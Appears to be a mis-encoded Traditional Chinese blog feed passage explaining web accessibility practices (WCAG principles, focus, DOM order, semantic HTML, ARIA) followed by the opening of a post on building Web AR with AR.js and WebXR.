å¯æ„ŸçŸ¥ï¼ˆPerceivableï¼‰ï¼šæ‰€æœ‰è³‡è¨Šèˆ‡ä½¿ç”¨è€…ä»‹é¢å…ƒä»¶éƒ½å¿…é ˆè¦èƒ½ä»¥å„ç¨®ä½¿ç”¨è€…èƒ½æ„ŸçŸ¥çš„æ–¹å¼ï¼Œå‘ˆç¾çµ¦ä½¿ç”¨è€…ã€‚åƒæ˜¯èƒ½è®“ Screen Reader é–±è®€å‡ºå…§å®¹ã€‚ä¸èƒ½è®“ä½¿ç”¨è€…é€éå„ç¨®æ„Ÿå®˜éƒ½ç„¡æ³•æ„ŸçŸ¥åˆ°å…§å®¹ã€‚

å¯æ“ä½œï¼ˆOperableï¼‰ï¼šä½¿ç”¨è€…å…ƒä»¶èˆ‡ç¶²é å…§å®¹é–“çš„å°è¦½éƒ½è¦å¯æ“ä½œï¼Œä¸èƒ½å‡ºç¾ä½¿ç”¨è€…ç„¡æ³•æ“ä½œçš„ä»‹é¢ã€‚

å¯ç†è§£ï¼ˆUnderstandableï¼‰ï¼šå‘ˆç¾çµ¦ä½¿ç”¨è€…çš„è³‡è¨Šèˆ‡æ“ä½œæ–¹å¼éƒ½è¦èƒ½è¢«ä½¿ç”¨è€…ç†è§£ã€‚

å¼·å¥ï¼ˆRobustï¼‰ï¼šä¸è«–æ˜¯è¢«å“ªç¨®è¼”åŠ©ç§‘æŠ€å·¥å…·æˆ–æ˜¯å„ç¨® user agents æ‰€å­˜å–ï¼Œç¶²ç«™å…§å®¹éƒ½è¦èƒ½ä¸å—å½±éŸ¿ï¼Œå‘ˆç¾çµ¦ä½¿ç”¨è€…å®Œæ•´çš„å…§å®¹ï¼Œè‹¥ä½¿ç”¨è€…ä½¿ç”¨çš„å·¥å…·è®Šå¾—æ›´åŠ é€²æ­¥ï¼Œç¶²ç«™ä¹Ÿå¾—è·Ÿä¸Šè…³æ­¥ï¼Œç¶­æŒå…§å®¹çš„å­˜å–ã€é–±è®€æ€§ã€‚


é€™æ˜¯ç„¡éšœç¤™å…§å®¹çš„ä¸€å€‹æ¦‚è¦½ï¼Œé‚„å¯ä»¥é€é WebAIM æª¢æŸ¥æ¸…å–®ï¼Œä¾†æª¢è¦–æˆ‘å€‘è©²å¦‚ä½•ä¾ç…§ WCAG çš„æŒ‡å—å¯¦ä½œã€‚
å…¶ä»–è³‡æºé™¤äº† W3C çš„å®šç¾©æŒ‡å—å¤–ï¼Œé‚„æœ‰è¨±å¤šæ›´è¦ªå’Œçš„è³‡æºå¯ä»¥åƒè€ƒï¼Œç•¢ç«Ÿ Web accessibility ä¸æ˜¯å¾ˆæ–°çš„è­°é¡Œäº†ï¼Œåƒæ˜¯ MDN æˆ–æ˜¯ Google éƒ½æœ‰éå¸¸è©³ç´°çš„è³‡æ–™èˆ‡æ•™å­¸ï¼ŒUdacity ä¸Šä¹Ÿæœ‰ç›¸é—œèª²ç¨‹ã€‚
çœ‹å®Œå¤§æ¦‚éƒ½éœ€è¦èŠ±ä¸Šå¹¾å€‹å°æ™‚çš„æ™‚é–“ï¼Œå¦‚æœæƒ³å¿«é€Ÿäº†è§£çš„è©±ï¼Œå…¶å¯¦ä¹Ÿå·²ç¶“æœ‰ä¸å°‘é—œæ–¼ a11y çš„ç¹ä¸­æ–‡ç« ï¼Œåƒé€™ç¯‡ - å›æ­¸åˆå¿ƒï¼Œä¸€æ¢ Web Accessibilityï¼Œç°¡çŸ­ç²¾è¦ï¼Œæ•´ç†äº†ä¸Šé¢ Google èˆ‡ Udacity èª²ç¨‹çš„å…§å®¹ï¼Œé©åˆå¿«é€Ÿäº†è§£ä½•è¬‚ a11yï¼Œè€Œæœ€è¿‘éµäººè³½çš„é€™ç³»åˆ—æ–‡ä¹Ÿå¾ˆä¸éŒ¯ï¼Œè’é›†æ•´ç†éå¸¸å¤šè³‡è¨Šï¼Œç´°ç¯€å¾ˆå¤šï¼Œå¯ä»¥ç•¶ä½œåƒè€ƒå·¥å…·ï¼Œåœ¨å¯¦ä½œæ™‚éš¨æ™‚ç¿»é–±ï¼Œæ¨æ¨ã€‚
æ­¤å¤–ï¼Œä¸Šé¢çš„è³‡æºè‘—é‡åœ¨ä¸€èˆ¬çš„ç¶²ç«™ä¸Šï¼Œè€Œèº«ç‚ºè³‡æ–™è¦–è¦ºåŒ–çš„æ„›å¥½è€…ï¼Œæˆ‘å¾ˆå¥½å¥‡è©²å¦‚ä½•è™•ç† Data visualization ä¸Šçš„ Web Accessibility å•é¡Œã€‚
å¾ Lindsey çš„é€™ç¯‡æ–‡ç«  - Accessibility in d3 Bar Charts ä¸­å¯ä»¥çªºçŸ¥ä¸€äºŒã€‚
ä¸»è¦æ˜¯è¦åœ¨åœ–è¡¨ä¸­åŠ å…¥è¶³å¤ çš„æè¿°æ–‡å­—ï¼Œç„¶å¾Œåœ¨è¨­è¨ˆé¡è‰²æ™‚ï¼Œä½¿ç”¨ä¸€äº›è¼”åŠ©å·¥å…·å¦‚ coblis ä¾†å»ºç«‹ color blind friendly çš„åœ–è¡¨ã€‚
è‹¥æ˜¯è¼ƒå¸¸ä½¿ç”¨ SVG ä¾†è£½ä½œå‹•æ…‹åœ–è¡¨çš„äººï¼Œæ¨è–¦ç ”è®€ä¸€ä¸‹é€™ç¯‡å°ˆé–€ä»‹ç´¹å¦‚ä½•ç‚ºä½ çš„ SVG å¢å¼· accessibility çš„æ–‡ç«  -  accessible-svgsï¼Œå¯ä»¥ç‚ºä½ çš„è³‡è¨Šåœ–è¡¨åœ¨ Web Accessibility ä¸Šå¸¶ä¾†éå¸¸å¤§çš„æ”¹å–„ã€‚
å¯¦ä½œè¦é»çŸ¥é“äº†ç‚ºä½•éœ€è¦äº†è§£ Web Accessibilityï¼Œä¹ŸçŸ¥é“äº†æœ‰å“ªäº›è³‡æºå¯ä»¥é–±è®€ï¼Œæ¥ä¸‹ä¾†æ ¹æ“šä¸Šé¢é–±è®€çš„è³‡æ–™ï¼Œç°¡å–®ç¸½çµå¹¾å€‹å¯¦ä½œä¸Šè¦é—œæ³¨çš„é‡é»ï¼š
æ€è€ƒç¶²ç«™èƒ½ä»¥ä»€éº¼æ–¹å¼ç€è¦½é€™å…¶å¯¦æ˜¯ å›æ­¸åˆå¿ƒï¼Œä¸€æ¢ Web Accessibility é€™ç¯‡æ–‡ç« ä¸­æ‰€æåˆ°çš„çµè«–ï¼Œæˆ‘è¦ºå¾—è »æœ‰é“ç†çš„ã€‚
èˆ‡å…¶æ€è€ƒä½¿ç”¨è€…å¤±å»ä»€éº¼æ„Ÿå®˜èƒ½åŠ›ï¼Œä¸å¦‚å°ˆæ³¨åœ¨ä½ çš„ç¶²ç«™èƒ½æä¾›å“ªäº›æ–¹å¼ç€è¦½ã€‚å¯èƒ½æ˜¯ screen readerã€éµç›¤ï¼ˆkeyboardï¼‰ã€è²æ§æˆ–çœ¼å‹•å„€ç­‰å…¶ä»–äººæ©Ÿä»‹é¢ã€‚å¾é€™äº›æ“ä½œä»‹é¢å»æ€è€ƒè©²æ€éº¼åŠ å¼·è‡ªå·±ç¶²ç«™çš„å¯è¨ªæ€§ã€‚
ç¶²é å…ƒä»¶çš„å¯èšç„¦æ€§æ‰€è¬‚çš„å¯èšç„¦ï¼ŒæŒ‡çš„å°±æ˜¯å…ƒä»¶èƒ½å¤ æˆç‚ºç„¦é»ï¼Œè€Œæ‰€è¬‚ç„¦é»ï¼Œæ˜¯æŒ‡ç•¶å‰è¢å¹•ä¸Šç€è¦½å™¨ç•¶ä¸‹èƒ½æ¥æ”¶ä¾†è‡ªéµç›¤è¼¸å…¥ã€å‰ªè²¼æ¿è¼¸å‡ºçš„å…ƒä»¶ï¼ˆå­—æ®µã€è¤‡é¸æ¡†ã€æŒ‰éˆ•æˆ–é€£çµç­‰è¼¸å…¥é …ç›®ï¼‰ï¼Œæ›´ç°¡å–®ä¾†èªªï¼Œå°±æ˜¯ä½¿ç”¨è€…æ­¤åˆ»æ­£åœ¨æ“ä½œçš„å…ƒä»¶ã€‚
ç‚ºä»€éº¼å¯èšç„¦æ€§å¾ˆé‡è¦å‘¢ï¼Ÿé™¤äº†è®“ä½¿ç”¨è€…çŸ¥é“è‡ªå·±ç›®å‰æ‰€ä½¿ç”¨çš„å…ƒä»¶å¤–ï¼Œå°±æ˜¯è®“ screen reader çŸ¥é“ç›®å‰è©² read å“ªå€‹å…ƒä»¶ã€‚è€Œç€è¦½å™¨ä¸€æ¬¡åªèƒ½èšç„¦åœ¨ä¸€å€‹å…ƒä»¶ä¸Šï¼Œé€™å€‹ç‰¹æ€§è®“ screen reader ä¸æœƒåŒæ™‚è®€åˆ°å…©å€‹ä¸åŒå…ƒä»¶çš„æè¿°ã€‚
åœ¨ä¸€èˆ¬ç€è¦½å™¨ä¸Šé ­ï¼Œè¢«èšç„¦çš„å…ƒä»¶é€šå¸¸é è¨­æœƒä»¥ä¸€å€‹è—è‰²å¤–æ¡†åŒ…è£¹ä½ï¼š

å¯¦å‹™ä¸Šå¾ˆå¤šäººéƒ½æœƒç”¨ outline: none æŠŠé€™å€‹å¤–æ¡†æ‹¿æ‰ï¼Œä½†å¯¦éš›ä¸Šæ˜¯éå¸¸ä¸å‹å–„çš„è¡Œç‚ºï¼Œè‹¥æ˜¯ä¸å–œæ­¡ç€è¦½å™¨é è¨­çš„æ¨£å¼ï¼Œå¯ä»¥è·Ÿè¨­è¨ˆå¸«æºé€šï¼Œçœ‹è¦å¦‚ä½•ä¿®æ”¹è¢«èšç„¦çš„å…ƒä»¶æ¨£å¼ï¼Œä½†è¨˜å¾—è¦èƒ½è®“ä½¿ç”¨è€…æ³¨æ„åˆ°æ¨£å¼çš„è®ŠåŒ–ï¼Œæ‰èƒ½å¹«åŠ©ä»–å€‘åˆ¤æ–·å…ƒä»¶çš„èšç„¦èˆ‡å¦ã€‚å¦‚ Youtube ä¸Šçš„å›å¾©æŸ¥çœ‹æŒ‰éˆ•ï¼š

å¦å¤–è¦æ³¨æ„çš„æ˜¯ï¼Œä¸¦éæ‰€æœ‰å…ƒä»¶éƒ½è¦è¨­æˆå¯èšç„¦ï¼Œåƒæ˜¯æ–‡ç« å…§æ–‡æœ¬èº«ï¼Œæˆ–æ˜¯å…¶ä»–å³ä¾¿è®“ screen reader æœ—è®€å‡ºä¾†ä¹Ÿç„¡æ³•å¾ˆå¥½å‚³é”æ„æ€çš„å…ƒä»¶ï¼Œå…¶å¯¦è·³éåè€Œæ¯”è¼ƒä¸æœƒé€ æˆæ··æ·†èˆ‡å›°æ“¾ã€‚
DOM çš„é †åºScreen reader åœ¨ç§»å‹•æ™‚ï¼Œæœƒä¾ç…§ DOM çš„é †åºé€²è¡Œï¼Œæ‰€ä»¥æ‡‰ç•¶ç›¡é‡å°‡ä½ æƒ³è¦å‘ˆç¾çµ¦ä½¿ç”¨è€…çš„å…§å®¹é †åºï¼Œå®Œæ•´çš„å°æ‡‰åˆ° DOM çš„é †åºä¸Šé ­ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œé‚„å¾—æ³¨æ„ CSS çš„å½±éŸ¿ï¼Œä¾‹å¦‚ floatï¼Œå°±å¯èƒ½æœƒé€ æˆè¦–è¦ºä¸Šçš„é †åºèˆ‡ DOM é †åºæœ‰æ‰€å·®ç•°ï¼Œå°è‡´ screen reader æœ—è®€çš„æ¬¡åºå—åˆ°å½±éŸ¿èˆ‡ç•«é¢ä¸ç¬¦ï¼š
&lt;button style=&quot;float: right&quot;&gt;1&lt;/button&gt;&lt;button&gt;2&lt;/button&gt;&lt;button&gt;2&lt;/button&gt;

122
å¦å¤–ï¼Œå–„ç”¨ tabindexï¼Œèƒ½å¤ æ›´å¥½çš„å¹«åŠ©ä½¿ç”¨è€…æ“ä½œéµç›¤ï¼ˆtabï¼‰ç€è¦½ç¶²ç«™æ™‚çš„ç§»å‹•é †åºï¼Œç„¡è«–æ˜¯è·³ééš±è—åœ¨ Responsive è¡¨å–®é¸é …ä¸­çš„å…ƒä»¶ï¼Œæˆ–æ˜¯åœ¨é–‹å•Ÿçš„ Modal ä¸­è£½é€ å‡º Key trapï¼Œè®“ä½¿ç”¨è€…ä¸æœƒç§»å‹•åˆ° Modal è¦†è“‹ä¸‹çš„å…ƒä»¶ä¸Šã€‚
èªç¾©åŒ–æ¨™ç±¤çœ¾æ‰€çš†çŸ¥ï¼ŒSemantic HTML å°æ–¼æé«˜ SEO å¾ˆæœ‰å¹«åŠ©ï¼Œç„¶è€Œï¼Œå®ƒä¹Ÿèƒ½å¤§å¤§å¢åŠ ç¶²ç«™çš„å¯è¨ªæ€§ï¼ˆå¤§æ¦‚ä¹Ÿæ˜¯å› æ­¤æ‰æœƒè®“ SEO æ•ˆæœæå‡ï¼‰ï¼Œä¸€å€‹å¥½çš„ Semantic HTML Element æ‡‰è©²åŒ…å«ï¼š

Roleï¼š å…ƒä»¶çš„é¡å‹ï¼ˆæŒ‰éˆ•ã€input å…ƒä»¶ã€è¶…é€£çµç­‰ç­‰ï¼‰
Name(Label)ï¼šé€šå¸¸èˆ‡ input å…ƒä»¶ä¸¦ç”¨ï¼Œåƒæ˜¯ radio inputã€dropdown list ç­‰ç­‰
Stateï¼šå…ƒä»¶ç•¶ä¸‹çš„ç‹€æ…‹ï¼ˆé»æ“Šã€å±•é–‹ã€æ”¶åˆï¼‰
Valueï¼šå…ƒä»¶å…§çš„å€¼ï¼ˆInput å…ƒä»¶å…§çš„å€¼ã€Button ä¸Šçš„æ–‡å­—ç­‰ç­‰ï¼‰

ç€è¦½å™¨æœƒæ ¹æ“šä½ çš„ HTML å»ºé€ å‡º DOM Treeï¼ŒåŒæ™‚ä¹Ÿæœƒä¾ç…§ä½ åœ¨ DOM å…ƒä»¶ä¸Šçš„è³‡è¨Šå»ºé€ å‡º Accessibility Treeï¼ˆsourceï¼‰ï¼š

è€Œ Screen reader å°±æœƒæ ¹æ“šé€™æ£µ Accessibility Tree é€²è¡Œæœ—è®€ï¼Œå› æ­¤ä½ æä¾›çš„ Semantic HTML è¶Šæ¸…æ¥šï¼Œè³‡è¨Šè¶Šè©³ç´°ï¼Œå°±èƒ½å¤ å»ºæ§‹å‡ºè¶Šå¼·å¥çš„ Accessibility Tree ä¾›è¼”åŠ©å·¥å…·åƒè€ƒã€‚
å†è€…ï¼Œå¦‚åŒæ–‡ç« å‰é ­æåˆ°çš„ï¼Œç¶²é ä¸Šçš„åª’é«”å…ƒä»¶ï¼Œåƒæ˜¯ imgã€video æˆ–æ˜¯è¦–è¦ºåœ–è¡¨ï¼Œéƒ½æ‡‰è©²æä¾›å°æ‡‰çš„ alt æè¿°ï¼Œè®“ Screen reader è‡³å°‘èƒ½æ ¹æ“š alt ä¾†èªªæ˜è©²åª’é«”å…ƒä»¶çš„å…§å®¹ã€‚ä¸éï¼Œè‹¥æ˜¯å–®ç´”æ‹¿ä¾†è£é£¾ç”¨çš„ imgï¼Œå¯ä»¥çµ¦äºˆ alt ç©ºå€¼ï¼Œä»£è¡¨å…¶è£é£¾æ€§ã€‚
æƒ³æª¢æ¸¬ç¶²ç«™æ˜¯å¦æœ‰è¶³å¤ å®Œæ•´çš„ Accessibility Tree çš„è©±ï¼Œå¯ä»¥ç”¨ Chrome æ‰“é–‹ä½ æƒ³çœ‹çš„ç¶²ç«™ï¼Œä¸¦ä¸”é–‹å•Ÿé–‹ç™¼è€…å·¥å…·ï¼Œåœ¨ Element æ¨™ç±¤å…§ï¼Œå³å´å¯ä»¥æ‰¾åˆ° Accessibility çš„ tabï¼Œåœ¨é‚£é‚Šå°±èƒ½çœ‹åˆ°ç•¶å‰é é¢å…ƒä»¶çš„ Accessibility Treeï¼š

WAI-ARIAWAI-ARIAï¼Œä»£è¡¨ Web Accessibility Initiative â€” Accessibility Rich Internet Applications ï¼ˆç¶²é å¯è¨ªæ€§å€¡è­° â€” ç„¡éšœç¤™ç¶²é æ‡‰ç”¨ï¼‰ã€‚
ä¸Šé¢ç« ç¯€æˆ‘å€‘æåˆ°ç€è¦½å™¨æœƒä¾ç…§ Semantic HTML Element ä¾†å»ºæ§‹ Accessibility Treeï¼Œç„¶è€Œæœ‰æ™‚ä½ éœ€è¦ä½¿ç”¨åƒæ˜¯ divã€span ç­‰å…ƒç´ ä¾†åšä¸€äº›å®¢è£½åŒ–çš„å…ƒä»¶æ™‚ï¼Œè©²æ€éº¼è¾¦å‘¢ï¼Ÿä¸å°±ç„¡æ³•ä¿æŒèªç¾©äº†å—ï¼Ÿ
é€™æ™‚ WAI-ARIA å°±æ´¾å¾—ä¸Šç”¨å ´äº†ã€‚ä½¿ç”¨ ARIA å±¬æ€§ï¼Œæˆ‘å€‘å°±å¯ä»¥è£œè¶³å…ƒä»¶ç¼ºå°‘çš„è¨Šæ¯ï¼Œè®“å®ƒé€²å…¥ Accessibility Tree ç•¶ä¸­ã€‚ï¼ˆsourceï¼‰

èˆ‰å€‹ä¾‹å­ï¼š
ä¸€å€‹ç”¨ &lt;li&gt; å…ƒä»¶æ‰€å®¢è£½åŒ–çš„ checkboxï¼Œæˆ‘å€‘å¯ä»¥ä¾é  CSS è®“ä»– â€œè¡¨ç¾â€ å¾—åƒ checkboxï¼Œå°æ–¼è¦–åŠ›æ­£å¸¸çš„äººä¾†èªªæ˜¯æ²’å•é¡Œçš„ï¼Œä½† screen reader å¯ä¸èªå¾—ä»–ï¼Œå› æ­¤æˆ‘å€‘è‡³å°‘å¿…é ˆåŠ ä¸Š ARIA å±¬æ€§ä¸­çš„ï¼šrole èˆ‡ aria-*ï¼Œè®“å…¶åŠ å…¥åˆ° Accessibility Tree ä¸­ï¼š
- &lt;li tabindex=&quot;0&quot; class=&quot;checkbox&quot; checked&gt;+ &lt;li tabindex=&quot;0&quot; class=&quot;checkbox&quot; role=&quot;checkbox&quot; checked aria-checked=&quot;true&quot;&gt;  Receive promotional offers&lt;/li&gt;

role ï¼Œç­‰æ–¼å®£å‘Šè©² DOM å…ƒä»¶è©²æ‰®æ¼”ä»€éº¼è§’è‰²ï¼Œåƒæ˜¯ checkboxã€button æˆ– dialog ç­‰ï¼Œé‚„å¯å†åˆ†é¡å‡º Widget rolesã€Composite roles å’Œ Landmark roles ç­‰ç­‰ã€‚è©³ç´° spec å¯ä»¥çœ‹ W3C çš„å®šç¾©
è€Œæ­é… role ä½¿ç”¨çš„ aria-* å‰‡ç‚ºå…ƒä»¶å®šç¾©äº†å±¬æ€§èˆ‡ç‹€æ…‹ï¼Œåƒæ˜¯ä¸Šé¢ä¾‹å­ä¸­çš„ aria-checked=&quot;true&quot; å³ç‚ºå…ƒç´ ç‹€æ…‹çš„ä¸€ç¨®ï¼Œå‘ŠçŸ¥ Accessibility Tree é€™å…ƒä»¶ç›®å‰å±¬æ–¼ checked ç‹€æ…‹ã€‚
ä¹Ÿèƒ½é€é aria-lable è¨­å®šå°ˆé–€çµ¦è¼”åŠ©å·¥å…·ä½¿ç”¨çš„ APIï¼š
&lt;button aria-label=&quot;screen reader only label&quot;&gt;&lt;/button&gt;

æˆ–æ˜¯è¨­å®šçˆ¶é …&#x2F;å­é …è¯ç¹«ï¼Œä¾‹å¦‚æ§åˆ¶ç‰¹å®šå€åŸŸçš„å®¢è£½åŒ–æ²è»¸ï¼š
&lt;div role=&quot;scrollbar&quot; aria-controls=&quot;main&quot;&gt;&lt;/div&gt;&lt;div id=&quot;main&quot;&gt;// . . .&lt;/div&gt;

é—œæ–¼ role èˆ‡ aria-* ç‹€æ…‹å’Œå±¬æ€§ï¼Œå¯ä»¥å…ˆå¾ MDN çš„é€™ä»½æ–‡ä»¶æ¦‚è§€æ‰€æœ‰åˆ—è¡¨ï¼Œç„¶å¾Œå¾ W3C çš„å®šç¾©ä¸­å»ç¿»æ‰¾è©³ç´°è³‡è¨Šã€‚
è‰²å½©ã€æ¨£å¼æ–‡ç« å‰é¢æœ‰æåˆ°ï¼Œè¨­è¨ˆé¡è‰²æ™‚ï¼Œæ‡‰ç•¶ä½¿ç”¨ä¸€äº›è¼”åŠ©å·¥å…·å¦‚ coblis ä¾†æ¨¡æ“¬è‰²ç›²çš„ä½¿ç”¨è€…æ˜¯å¦‚ä½• â€œçœ‹â€ ä½ çš„ç¶²ç«™ï¼Œå¯ä»¥æ ¹æ“šé€™äº›æ¸¬è©¦èˆ‡è³‡è¨Šï¼Œèˆ‡è¨­è¨ˆå¸«è¨è«–ï¼Œè£½ä½œå‡º color blind friendly çš„ä»‹é¢ã€‚
é™¤äº†é¡è‰²ä¹‹å¤–ï¼Œå¾æ–‡å­—çš„å¤§å°ã€è¡¨æ ¼çš„é–“éš™ï¼Œåˆ°é•·æ¢åœ–ä¸­æ¯æ¢ Bar çš„è·é›¢ï¼Œéƒ½å¯èƒ½å½±éŸ¿åˆ°è¦–è¦ºéšœç¤™çš„ä½¿ç”¨è€…ï¼Œä¹Ÿéƒ½å¯ä»¥åœ¨è¨­è¨ˆç„¡éšœç¤™ç¶²ç«™æ™‚è€ƒæ…®é€²å»ã€‚
çµè«–ä¸çŸ¥é“å¤§å®¶æŠ•èº« Web é ˜åŸŸçš„å‹•æ©Ÿæ˜¯ä»€éº¼ï¼Œæˆ‘æƒ³ä¸€å®šæœ‰éƒ¨åˆ†äººçš„ç†ç”±èˆ‡æˆ‘ç›¸åŒï¼Œç›¸ä¿¡ Web æ˜¯æœ€å¹³æ˜“è¿‘äººçš„åª’ä»‹ï¼Œèƒ½è¼•æ˜“æŠŠä»»ä½•è³‡è¨Šå¸¶çµ¦å…¨ä¸–ç•Œï¼Œä½ ä¸ç”¨å­˜éŒ¢åŠå¤©æ‰èƒ½è²·åˆ°ä¸€å° iPhone é€²å…¥ App Store ä¸‹è¼‰æ‡‰ç”¨ç¨‹å¼ï¼Œåªéœ€è¦åˆ°åœ–æ›¸é¤¨æŠŠé›»è…¦æ‰“é–‹ï¼Œé€éç€è¦½å™¨å³å¯é€£æ¥ä¸–ç•Œã€‚å¦‚æœä½ ä¹Ÿæœ‰åŒæ¨£ä¿¡å¿µï¼Œé™¤äº†åŠ å¼· Web performanceï¼Œè®“å­˜å–ç¶²ç«™çš„é–€æª»é™ä½å¤–ï¼Œæå‡ Web Accessibility è®“ç¶²ç«™èƒ½çœŸæ­£æœå‹™åˆ° â€œæ‰€æœ‰äººâ€ï¼Œçµ•å°ä¹Ÿæ˜¯å¿…ä¿®çš„èª²é¡Œä¹‹ä¸€ï¼Œå¼­å¹³è³‡è¨Šè½å·®ï¼Œè½å¯¦å…¬å¹³æ­£ç¾©ï¼Œå¾ä½ æˆ‘åšèµ·ï¼
P.S. Web Accessibility çš„å…§å®¹å¾ˆå¤šï¼Œé€™ç¯‡æ–‡ç« æ—¨åœ¨å¼•èµ·å¤§å®¶å°å…¶çš„é‡è¦–ï¼Œè©³ç´°çš„è¦æ ¼èˆ‡å¯¦ä½œç´°ç¯€å¯ä»¥å¾åº•ä¸‹çš„åƒè€ƒè³‡æ–™ä¸­å»é–±è®€ã€‚
è³‡æ–™ä¾†æº
React rally 2019
Amphora
MDN - å¯è¨ªå•æ€§
Google - ç„¡éšœç¤™åŠŸèƒ½
å›æ­¸åˆå¿ƒï¼Œä¸€æ¢ Web Accessibility
å¯¦è¸ç„¡éšœç¤™ç¶²é è¨­è¨ˆï¼ˆWeb Accessibilityï¼‰ç³»åˆ—
Accessibility in d3 Bar Charts

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>web</tag>
        <tag>javascript</tag>
        <tag>web accessibility</tag>
        <tag>a11y</tag>
      </tags>
  </entry>
  <entry>
    <title>æ·ºåš Web AR</title>
    <url>/2019/07/16/web-ar/</url>
    <content><![CDATA[å‰è¨€è¿‘å¹´ VR&#x2F;AR ä¸€ç›´ä¸æ–·å‡ºç¾åœ¨å¤§å®¶çš„è¦–ç·šå…§ï¼Œé›–ç„¶ä¸€ç›´æ²’æœ‰ä»€éº¼æ®ºæ‰‹ç´šçš„æ‡‰ç”¨å‡ºç¾ï¼Œä½†é€™é˜»æ­¢ä¸äº†é–‹ç™¼è€…å€‘çš„é›„å¿ƒå£¯å¿—ï¼Œå°¤å…¶æ˜¯ JavaScript ç¤¾ç¾¤ï¼Œç•¢ç«Ÿ Jeff Atwood èªªéï¼š

â€œAny application that can be written in JavaScript, will eventually be written in JavaScript.â€ â€” Jeff Atwood, Author, Entrepreneur, Cofounder of StackOverflow

éš¨è‘— a-frame çš„å‡ºç¾ï¼ŒWebVR æˆç‚ºç¾å¯¦ï¼Œä¸¦ä¸”å¾ˆå®¹æ˜“é–‹ç™¼ï¼›Web AR éƒ¨åˆ†é€²å±•å‰‡ç›¸å°ç·©æ…¢ã„§äº›ï¼Œç€è¦½å™¨åŸç”Ÿæ”¯æ´çš„ API é‚„ä¸€ç›´è™•æ–¼ä¸ç©©å®šçš„é–‹ç™¼éšæ®µï¼Œä½†å³ä¾¿å¦‚æ­¤ï¼Œæˆ‘å€‘é‚„æ˜¯å¯ä»¥åœ¨ç‰¹å®šç‰ˆæœ¬çš„ç€è¦½å™¨ä¸Šä½¿ç”¨ï¼Œæ­¤å¤–ï¼Œä¹Ÿæœ‰åƒæ˜¯ AR.js é€™æ¨£èåˆ artoolkitã€three.jsã€ï¼·ebGL å’Œ WebRTC ç­‰æŠ€è¡“çš„å·¥å…·å¯ä»¥ä½¿ç”¨ã€‚
ä»Šå¤©å°±ä¾†ç¨ç¨ç ”ç©¶ä¸€ä¸‹ï¼Œçœ‹çœ‹ç›®å‰çš„æŠ€è¡“èƒ½å¦‚ä½•é–‹ç™¼ Web ARï¼
ç…§æ…£ä¾‹ï¼Œé–‹å§‹å‰å…ˆçœ‹é» demoï¼ŒæŠŠ Pokemon å¸¶åˆ°ä½ å®¶å®¢æ‡‰ï¼š



ç›®å‰çš„å·¥å…·æœ‰å“ªäº›Createï¼·ebVR é€™ç¶²ç«™ä¸Šåˆ—å‡ºäº†ä¸€äº›ç›®å‰æœ‰çš„ libraryï¼Œä»¥åŠç›®å‰æ”¯æ´ WebAR çš„ç€è¦½å™¨ï¼š

å…¶ä¸­ AR.js ä½¿ç”¨äº† A-Frame (åŸºæ–¼ Three.js) ä»¥åŠ JSARTookit5ï¼ˆJavaScript ç§»æ¤ç‰ˆçš„ ARToolKitï¼‰ï¼Œè€Œé€™å…©å€‹æŠ€è¡“ä¸»è¦çš†æ˜¯åˆ©ç”¨ WebGL ç‚ºä¸»ï¼Œå› æ­¤å¤§å¤šç¾è¡Œçš„ç€è¦½å™¨éƒ½èƒ½ç›´æ¥æ”¯æ´ï¼Œä¸éœ€è¦ç‰¹æ®Šçš„ APIã€‚
é€™å¤§æ¦‚ä¹Ÿæ˜¯ç‚ºä½• AR.js èƒ½åœ¨ GitHub ä¸Šæ“æœ‰ä¸€è¬å¤šé¡†æ˜Ÿæ˜Ÿï¼Œé å‹éä¸Šåˆ—å…¶ä»–å¥—ä»¶çš„åŸå› ã€‚å†åŠ ä¸Šä½œè€…çš„å¯¦é©—è­‰æ˜ AR.js å³ä¾¿åœ¨å…©å¹´çš„è€èˆŠæ‰‹æ©Ÿä¸Šä¹Ÿèƒ½é‹è¡Œé †æš¢ï¼Œæ“æœ‰è‰¯å¥½çš„ Performanceã€‚
ä½† AR.js ä¹Ÿä¸¦éæ²’æœ‰ç¼ºé»ï¼Œç”±æ–¼æ˜¯åŸºæ–¼ ARToolKitï¼Œå› æ­¤åªèƒ½å¤ æ”¯æ´ Marker-based çš„ AR æ•ˆæœï¼Œä¹Ÿå°±æ˜¯åƒæœ€å‰é¢çš„ Demo åœ–ç‰‡ä¸€æ¨£ï¼Œæ˜¯éœ€è¦åœ¨é¡é ­å…§æ”¾ç½®ä¸€å€‹è¨­å®šå¥½çš„ Markerï¼Œè®“å…¶è¾¨è­˜ï¼Œå–å¾—ç’°å¢ƒçš„ä¸€äº› Sensor è³‡è¨Šï¼ŒåŒ…å«é¡é ­çš„æ·±æ·ºé è¿‘ç­‰ç­‰ï¼Œæ‰èƒ½è®“ AR ç‰©ä»¶æ¸²æŸ“åœ¨è¦–çª—ä¸­ã€‚
å³ä¾¿å¦‚æ­¤ï¼ŒAR.js å…¶ç°¡æ½”ã€ä¾¿åˆ©çš„ä½¿ç”¨æ–¹å¼ï¼ˆæœ‰ a-frame èˆ‡ threejs çš„ extensionï¼‰ï¼Œèƒ½è®“ä½ ç”¨çŸ­çŸ­ 10 è¡Œç¨‹å¼ç¢¼å°±ç”¢ç”Ÿå‡ºä¸€å€‹ WebAR æ•ˆæœçš„ç¶²é ï¼Œé‚„æ˜¯éå¸¸å¥½ç”¨çš„ã€‚

å¦‚æœä½ æ˜¯ä½¿ç”¨ AR.js çš„è©±ï¼ŒåŸºæœ¬ä¸Šç¾è¡Œæœ‰æ”¯æ´ WebGL çš„æ‰‹æ©Ÿç€è¦½å™¨å°±éƒ½èƒ½å¤ é‹è¡Œï¼Œä¸éœ€è¦é¡å¤–çš„ Polyfill ç­‰ç­‰ã€‚
ä½†å¦‚æœä½ æƒ³è¦ä½¿ç”¨é Marker-based æ•ˆæœçš„ AR æ‡‰ç”¨ï¼Œä½ å°±å¾—ç ”ç©¶ WebXR Device APIï¼Œå…¶å‰èº«ç‚º WebAR APIã€‚
WebXR Device APIWebXR Device API ç¾åœ¨é‚„åœ¨ä¸æ–·æ›´æ–°ä¸­ï¼Œä¸æ˜¯å€‹ç©©å®šçš„ APIã€‚
